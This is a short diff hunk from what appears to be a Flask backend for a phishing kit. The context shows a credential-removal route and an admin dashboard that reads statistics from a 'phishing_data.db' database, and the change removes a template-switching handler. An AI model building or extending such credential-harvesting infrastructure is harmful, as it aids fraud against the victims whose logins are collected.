@@ -78,11 +78,6 @@ def remove_credential():
 # Admin Panel
 @app.route("/admin", methods=["GET", "POST"])
 def admin_dashboard():
-    if request.method == "POST":
-        # Handle site configuration (e.g., template change)
-        new_template = request.form.get("template")
-        if new_template and os.path.exists(os.path.join(app.config["TEMPLATES_FOLDER"], new_template)):
-            app.config["ACTIVE_TEMPLATE"] = new_template
 
     # Fetch statistics
     conn = sqlite3.connect("phishing_data.db")
